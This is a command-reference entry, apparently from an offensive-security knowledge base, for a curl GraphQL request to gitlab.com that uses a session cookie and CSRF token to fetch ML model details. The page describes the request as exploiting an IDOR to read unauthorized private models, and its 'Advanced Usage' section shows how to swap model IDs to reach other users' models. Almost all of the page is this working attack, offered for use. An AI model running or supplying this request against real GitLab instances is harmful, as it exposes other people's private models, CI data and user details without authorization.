---
id: cmd-gitlab-get-model
data: >-
  curl -X POST 'https://gitlab.com/api/graphql' -H 'Cookie:
  _gitlab_session=<your-session-cookie>' -H 'X-Csrf-Token: <your-csrf-token>' -H
  'Content-Type: application/json' -d
  '{"operationName":"getModel","variables":{"id":"gid://gitlab/Ml::Model/1000401"},"query":"query
  getModel($id: MlModelID!) { mlModel(id: $id) { id description name
  versionCount candidateCount latestVersion { id version packageId description
  candidate { id name iid eid status params { nodes { id name value __typename }
  __typename } metadata { nodes { id name value __typename } __typename }
  metrics { nodes { id name value step __typename } __typename } ciJob { id
  webPath name pipeline { id mergeRequest { id iid title webUrl __typename }
  user { id avatarUrl webUrl username name __typename } __typename } __typename
  } _links { showPath artifactPath __typename } __typename } _links { showPath
  __typename } __typename } __typename } }"}'
tags:
  - graphql
  - idor
  - query
type: command
output: null
executor: curl
platforms:
  - Web
  - GitLab
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:47.608Z'
verified: false
validated: true
submitted: true
---
# gitlab-graphql-get-model

## Command

```bash
curl -X POST 'https://gitlab.com/api/graphql' \
  -H 'Cookie: _gitlab_session=<your-session-cookie>' \
  -H 'X-Csrf-Token: <your-csrf-token>' \
  -H 'Content-Type: application/json' \
  -d '{"operationName":"getModel","variables":{"id":"gid://gitlab/Ml::Model/1000401"},"query":"query getModel($id: MlModelID!) { mlModel(id: $id) { id description name versionCount candidateCount latestVersion { id version packageId description candidate { id name iid eid status params { nodes { id name value __typename } __typename } metadata { nodes { id name value __typename } __typename } metrics { nodes { id name value step __typename } __typename } ciJob { id webPath name pipeline { id mergeRequest { id iid title webUrl __typename } user { id avatarUrl webUrl username name __typename } __typename } __typename } _links { showPath artifactPath __typename } __typename } _links { showPath __typename } __typename } __typename } }"}'
```

## Description

Sends a GraphQL POST request to GitLab's API to retrieve details of a specific ML model by its global ID, exploiting IDOR to access unauthorized private models.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--id` (in JSON) | Global ID of the model (e.g., gid://gitlab/Ml::Model/1000401) | Yes |
| `Cookie` header | Session cookie for authentication | Yes |
| `X-Csrf-Token` header | CSRF token from prior API response | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://gitlab.com/api/graphql' -H 'Cookie: ...' -H 'X-Csrf-Token: ...' -H 'Content-Type: application/json' -d '{...}' # As above
```

### Advanced Usage

Modify ID for different models:
```bash
# Replace ID in variables
-d '{"operationName":"getModel","variables":{"id":"gid://gitlab/Ml::Model/999999"},"query":"..."}'
```

## Expected Output

JSON object with data.mlModel containing id, description, name, versionCount, candidateCount, latestVersion details (params, metadata, metrics, ciJob, links). For unauthorized models, full private data is returned without errors.

## Related

- [[commands/gitlab-graphql-get-model-version]]
- [[procedures/Query-ML-Model-Details-via-GraphQL-IDOR]]
